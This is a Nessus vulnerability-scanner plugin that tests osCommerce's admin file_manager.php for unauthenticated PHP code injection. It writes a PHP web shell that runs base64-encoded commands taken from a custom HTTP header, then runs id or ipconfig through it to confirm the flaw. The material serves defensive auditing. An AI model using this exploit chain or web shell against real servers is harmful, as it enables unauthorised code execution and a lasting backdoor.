#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(42351);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_xref(name:"EDB-ID", value:"9556");

  script_name(english:"osCommerce file_manager.php Arbitrary PHP Code Injection (intrusive check)");
  script_summary(english:"Tries to inject PHP code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that can be abused to
execute arbitrary PHP code."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of osCommerce hosted on the remote web server allows a
remote attacker to access the Admin filemanager utility without
authentication.  Further, this utility appears to allow arbitrary PHP
code to be stored in files under the web server's document directory
and then executed subject to the privileges under which the web server
operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://forums.oscommerce.com/index.php?showtopic=343958");
  script_set_attribute(
    attribute:"solution",
    value:
"Secure the osCommerce 'admin' folder by renaming it and / or defining
access controls for it.

Also, consider removing the 'file_manager.php' script."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/11/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("oscommerce_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/oscommerce");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);


# Test an install.
install = get_install_from_kb(appname:'oscommerce', port:port);
if (isnull(install)) exit(0, "osCommerce wasn't detected on port "+port+".");
dir = install['dir'];


# Try to access the affected form.
#
# nb: if the admin's been renamed, we're out of luck here.
url = string(dir, "/admin/file_manager.php/login.php?action=save");

res = http_send_recv3(port:port, method:"GET", item:url);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if (
  'Administration Tool</title>' >!< res[2] ||
  '<form name="new_file"' >!< res[2] ||
  '<input type="text" name="filename"' >!< res[2] ||
  '<textarea name="file_contents"' >!< res[2]
) exit(1, "The file_manager.php script either has been removed or could not be located / accessed via port "+port+".");


# Define some variables.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >!< os) cmd = "id";
  else cmd = "ipconfig /all";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Windows IP Configuration";

filename = str_replace(
    find    : ".nasl",
    replace : string("-", unixtime(), ".php"),
    string  : SCRIPT_NAME
);
fake_srv = string("NESSUS_", toupper(rand_str()));
exploit = string(
  "# Created by the Nessus plugin ", SCRIPT_NAME, ".\n",
  "<?php passthru(base64_decode($_SERVER[HTTP_", fake_srv, "])); ?>\n"
);


# Try to injection PHP code.
foreach cmd (cmds)
{
  postdata = string(
    "filename=", filename, "&",
    "file_contents=", urlencode(str:exploit)
  );

  req = http_mk_post_req(
    port        : port,
    item        : url,
    data        : postdata,
    add_headers : make_array(
      "Content-Type", "application/x-www-form-urlencoded"
    )
  );
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

  hdrs = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(hdrs['$code'])) code = 0;
  else code = hdrs['$code'];

  if (isnull(hdrs['location'])) location = "";
  else location = hdrs['location'];

  # If we're redirected to our newly-created file...
  if (code == 302 && string("?info=", filename) >< location)
  {
    # Run the code we tried to inject.
    url2 = string(dir, "/", filename);

    req2 = http_mk_get_req(
      port        : port,
      item        : url2,
      add_headers : make_array(
        fake_srv, base64(str:cmd)
      )
    );
    res2 = http_send_recv_req(port:port, req:req2);
    if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

    # There's a problem if we see the expected command output.
    if ('ipconfig' >< cmd) pat = cmd_pats['ipconfig'];
    else pat = cmd_pats['id'];

    if (egrep(pattern:pat, string:res2[2]))
    {
      if (report_verbosity > 0)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote \n",
          "host using the following requests :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          http_mk_buffer_from_req(req:req), "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          http_mk_buffer_from_req(req:req2), "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
        if (report_verbosity > 1)
        {
          report = string(
            "\n",
            "It produced the following output :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            res2[2],
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "osCommerce", build_url(port:port, qs:dir+"/"));
